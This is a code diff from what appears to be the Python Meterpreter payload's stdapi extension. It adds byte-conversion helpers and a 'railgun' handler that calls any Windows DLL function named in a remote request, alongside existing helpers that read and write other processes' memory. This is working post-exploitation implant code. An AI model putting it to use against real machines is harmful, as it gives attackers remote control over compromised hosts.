@@ -552,6 +552,15 @@ IFA_LABEL      = 3
 
 meterpreter.register_extension('stdapi')
 
+def bytes_to_ctarray(bytes_):
+	ctarray = (ctypes.c_byte * len(bytes_))()
+	ctypes.memmove(ctypes.byref(ctarray), bytes_, len(bytes_))
+	return ctarray
+
+def ctarray_to_bytes(ctarray):
+	bytes_ = buffer(ctarray) if sys.version_info[0] < 3 else bytes(ctarray)
+	return bytes_[:]
+
 def calculate_32bit_netmask(bits):
 	if bits == 32:
 		netmask = 0xffffffff
@@ -1491,23 +1500,77 @@ def _win_memread(address, size, handle=-1):
 	result = ReadProcessMemory(handle, address, ctypes.byref(buff), size, ctypes.byref(read))
 	if not result:
 		return None
-	if sys.version_info[0] < 3:
-		buff = buffer(buff)[:]
-	else:
-		buff = bytes(buff)
-	return buff
+	return ctarray_to_bytes(buff)
 
 def _win_memwrite(address, data, handle=-1):
 	WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
 	WriteProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, size_t, ctypes.POINTER(size_t)]
 	size = len(data)
-	buff = (ctypes.c_byte * size)()
-	ctypes.memmove(buff, data, size)
+	buff = bytes_to_ctarray(data)
 	written = size_t()
 	result = WriteProcessMemory(handle, address, ctypes.byref(buff), size, ctypes.byref(written))
 	if not result:
 		return None
 	return written.value
+
+@meterpreter.register_function_windll
+def stdapi_railgun_api(request, response):
+	size_out = packet_get_tlv(request, TLV_TYPE_RAILGUN_SIZE_OUT)['value']
+	stack_blob = packet_get_tlv(request, TLV_TYPE_RAILGUN_STACKBLOB)['value']
+	buff_blob_in = packet_get_tlv(request, TLV_TYPE_RAILGUN_BUFFERBLOB_IN)['value']
+	buff_blob_inout = packet_get_tlv(request, TLV_TYPE_RAILGUN_BUFFERBLOB_INOUT)['value']
+	dll_name = packet_get_tlv(request, TLV_TYPE_RAILGUN_DLLNAME)['value']
+	func_name = packet_get_tlv(request, TLV_TYPE_RAILGUN_FUNCNAME)['value']
+	call_conv = packet_get_tlv(request, TLV_TYPE_RAILGUN_CALLCONV)['value']
+
+	buff_blob_in = bytes_to_ctarray(buff_blob_in)
+	buff_blob_out = (ctypes.c_byte * size_out)()
+	buff_blob_inout = bytes_to_ctarray(buff_blob_inout)
+
+	if ctypes.sizeof(ctypes.c_void_p) == 4:
+		native = ctypes.c_uint32
+		fmt = 'II'
+	elif ctypes.sizeof(ctypes.c_void_p) == 8:
+		native = ctypes.c_uint64
+		fmt = 'QQ'
+	else:
+		raise RuntimeError('unknown sizeof(void *)')
+
+	if call_conv.lower() == 'cdecl':
+		func_type = ctypes.CFUNCTYPE
+	elif call_conv.lower() == 'stdcall':
+		func_type = ctypes.WINFUNCTYPE
+	else:
+		raise ValueError('unknown calling convention')
+
+	call_args = []
+	func_args = []
+	for pos in range(0, len(stack_blob), struct.calcsize(fmt)):
+		arg_type, arg = struct.unpack(fmt, stack_blob[pos:pos + struct.calcsize(fmt)])
+		if arg_type == 0:    # literal
+			call_args.append(arg)
+			func_args.append(native)
+		elif arg_type == 1:  # relative to in
+			call_args.append(ctypes.byref(buff_blob_in, arg))
+			func_args.append(ctypes.c_void_p)
+		elif arg_type == 2:  # relative to out
+			call_args.append(ctypes.byref(buff_blob_out, arg))
+			func_args.append(ctypes.c_void_p)
+		elif arg_type == 3:  # relative to inout
+			call_args.append(ctypes.byref(buff_blob_inout, arg))
+			func_args.append(ctypes.c_void_p)
+		else:
+			raise ValueError('unknown argument type: ' + str(arg_type))
+
+	prototype = func_type(native, *func_args)
+	func = prototype((func_name, ctypes.WinDLL(dll_name)))
+	result = func(*call_args)
+
+	response += tlv_pack(TLV_TYPE_RAILGUN_BACK_ERR, ctypes.windll.kernel32.GetLastError())
+	response += tlv_pack(TLV_TYPE_RAILGUN_BACK_RET, result)
+	response += tlv_pack(TLV_TYPE_RAILGUN_BACK_BUFFERBLOB_OUT, ctarray_to_bytes(buff_blob_out))
+	response += tlv_pack(TLV_TYPE_RAILGUN_BACK_BUFFERBLOB_INOUT, ctarray_to_bytes(buff_blob_inout))
+	return ERROR_SUCCESS, response
 
 @meterpreter.register_function_windll
 def stdapi_railgun_memread(request, response):
